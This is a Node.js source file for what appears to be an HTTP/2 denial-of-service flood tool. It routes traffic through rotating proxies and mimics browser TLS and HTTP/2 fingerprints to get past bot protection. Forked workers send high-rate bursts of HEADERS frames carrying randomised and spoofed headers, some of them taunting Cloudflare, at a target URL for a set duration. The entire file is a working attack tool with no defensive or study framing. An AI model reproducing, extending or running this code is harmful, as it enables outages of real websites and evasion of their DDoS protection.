const fs = require('fs');
const os = require('os');
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const crypto = require('crypto');
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

process.on('uncaughtException', (e) => { });
process.on('unhandledRejection', (e) => { });

const brave = require('./brave');
const chrome = require('./chrome');
const edge = require('./edge');
const firefox = require('./firefox');
const mobile = require('./mobile');
const opera = require('./opera');
const operagx = require('./operagx');
const safari = require('./safari');
const settingstls = require('./tls');
const h2settings = require('./h2settings');

const browsers = ['brave', 'chrome', 'edge', 'opera', 'operagx', 'mobile', 'firefox', 'safari'];
const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxyfile = process.argv[6];

//console.log(`[Target]: ${target}\r\n[Time]: ${time}\r\n[Threads]: ${threads}\r\n[Ratelimit]: ${ratelimit}\r\n[ProxyFile]: ${proxyfile}\r\n`);

const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const url = new URL(target);
const statusesQ = []

var tls_config;
var h2_config;
var headers2;

let brwsind = 0;
let using_browser = '';
let statuses = {}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    const payload = data.subarray(9 + offset, 9 + offset + length);
    if (payload.length + offset != length) return null;
    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}


function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}

function generateRandomString(length) {
    return [...Array(length)].map(() => Math.random().toString(36).charAt(2)).join('');
}

const getBrowserHeaders = (browser) => {
    switch (browser) {
        case 'brave':
            return brave();
        case 'chrome':
            return chrome();
        case 'edge':
            return edge();
        case 'firefox':
            return firefox();
        case 'mobile':
            return mobile();
        case 'opera':
            return opera();
        case 'operagx':
            return operagx();
        case 'safari':
            return safari();
        default:
            throw new Error('Unknown browser');
    }
};

const getTlsSettings = (browser) => {
    const settings = settingstls();
    return settings[browser] || null;
};

const getH2Settings = (browser) => {
    const settings = h2settings();
    return settings[browser] || null;
};

const transformSettings = (settings) => {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
        "SETTINGS_ENABLE_PUSH": 0x2,
        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
        "SETTINGS_MAX_FRAME_SIZE": 0x5,
        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
    };

    return settings.map(([key, value]) => [settingsMap[key], value]);
};

const showBrowserSettings = () => {
    const browser = browsers[brwsind];
    const geth2s = getH2Settings(browser);
    tls_config = getTlsSettings(browser);
    h2_config = transformSettings(geth2s);
    using_browser = browser;
    headers2 = getBrowserHeaders(using_browser);
    //console.log(`[TLS_CONFIG] ==\r\n --ciphers: ${tls_config["ciphers"]}\r\n --sigalgs: ${tls_config["sigalgs"]}\r\n[H2_SETTINGS]  ==\r\n ${h2_config}\r\n`)
    brwsind = (brwsind + 1) % browsers.length;
};

showBrowserSettings();
setInterval(showBrowserSettings, 3000);

function main() {
    const [proxyHost, proxyPort] = proxy[Math.floor(Math.random() * proxy.length)].split(":");
    let SocketTLS;

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            SocketTLS = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
                session: crypto.randomBytes(16),
                secure: true,
                rejectUnauthorized: false,
                ciphers: tls_config["ciphers"].join(':'),
                sigalgs: tls_config["sigalgs"].join(':')
            }, () => {
                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);
                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        ...h2_config
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                SocketTLS.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) {
                                SocketTLS.write(encodeFrame(0, 4, "", 1));
                            }

                            if (frame.type == 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];
                                if (status == 403) SocketTLS.end(() => SocketTLS.destroy());
                                if (!statuses[status]) statuses[status] = 0;
                                statuses[status]++
                            }

                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (!statuses["GOAWAY"]) statuses["GOAWAY"] = 0;
                                    statuses["GOAWAY"]++
                                }
                                SocketTLS.end();
                            }
                        } else {
                            break;
                        }
                    }
                });

                SocketTLS.write(Buffer.concat(frames));

                if (SocketTLS && !SocketTLS.destroyed && SocketTLS.writable) {
                    for (let i = 0; i < ratelimit; i++) {
                        const randomString = generateRandomString(10);

                        const headers = [
                            [':method', 'GET'],
                            [':authority', url.hostname],
                            [':scheme', 'https'],
                            [':path', url.pathname]
                        ];

                        if (streamId >= Math.floor(ratelimit / 2)) {
                            headers2 = getBrowserHeaders(using_browser);
                        }

                        headers2.forEach(header => {
                            const [key, value] = header.split(/:(.+)/);
                            if (!headers.some(h => h[0] === key.trim())) {
                                headers.push([key.trim(), value.trim()]);
                            }
                        });

                        const headerOptions = [
                            "cookie",
                            "x-forward-min",
                            "x-cloudflare",
                            "1-xss",
                            "x-bad-sources",
                            "x-cloudflare-no",
                            "x-stop-please-fix-my-methods",
                            "if-you-blocked-all-attacks",
                            "ddos-dead-and-your-protection-too",
                            "delete-please-bad-sources",
                            "we-really-0iq",
                            "true-brain-okplz",
                            "and-juliend-ebanniy",
                            "stupid-fuck-u",
                            "stop-fix-ddos",
                            "we-kill-ddos",
                            "all-attacks-this-cloudflare",
                            "other-protection-very-good-and-very-price",
                        ];

                        let headers3 = Object.fromEntries(headerOptions.map(option =>
                            getWeightedRandom() ? [option, `${randomString}=${randomString}`] : [option, generateRandomString(1 + Math.floor(Math.random() * 15))]
                        ));

                        const headers4 = {
                            ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
                            ...(getWeightedRandom() && { 'referer': `https://${randomString}.com` })
                        }

                        let allHeaders = headers.concat(Object.entries(headers4)).concat(Object.entries(headers3));

                        let removedHeaders = [];
                        let maxHeadersToRemove = 1 + Math.floor(Math.random() * 10);

                        for (let k = 0; k < maxHeadersToRemove; k++) {
                            let maxLength = 0;
                            let headerToRemoveIndex = -1;

                            for (let j = 0; j < allHeaders.length; j++) {
                                const headerKey = allHeaders[j][0];
                                const headerValue = allHeaders[j][1];

                                if (headerKey !== 'accept-language' && headerKey !== 'user-agent' && headerKey !== ':path' && headerKey !== ':authority' && headerKey !== ':scheme') {
                                    if (headerValue.length > maxLength) {
                                        maxLength = headerValue.length;
                                        headerToRemoveIndex = j;
                                    }
                                }
                            }

                            if (headerToRemoveIndex !== -1) {
                                if (Math.random() < 0.5) {
                                    removedHeaders.push(allHeaders.splice(headerToRemoveIndex, 1)[0]);
                                } else {
                                    allHeaders[headerToRemoveIndex][1] = generateRandomString(10);
                                }
                            }
                        }

                        const insertIndex = Math.floor(Math.random() * allHeaders.length);

                        let packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(allHeaders)
                        ]);

                        SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                        streamId += 2;

                        allHeaders.splice(insertIndex, 1);
                        removedHeaders.forEach(header => allHeaders.push(header));
                    }
                }
            });
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });
}

if (cluster.isMaster) {
    const workers = {}
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Main start :)`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })

    setInterval(() => {

        let statuses = {}
        for (let w in workers) {
            if (workers[w][0].state == 'online') {
                for (let st of workers[w][1]) {
                    for (let code in st) {
                        if (statuses[code] == null)
                            statuses[code] = 0

                        statuses[code] += st[code]
                    }
                }
            }
        }

        console.clear();
        console.log(statuses);
    }, 1000)

    setTimeout(() => process.exit(1), time * 1000);
} else {
    let i = setInterval(() => {
        main();
    });

    setInterval(() => {
        if (statusesQ.length >= 4)
            statusesQ.shift()

        statusesQ.push(statuses)
        statuses = {}
        process.send(statusesQ)
    }, 950)

    setTimeout(() => process.exit(1), time * 1000);
}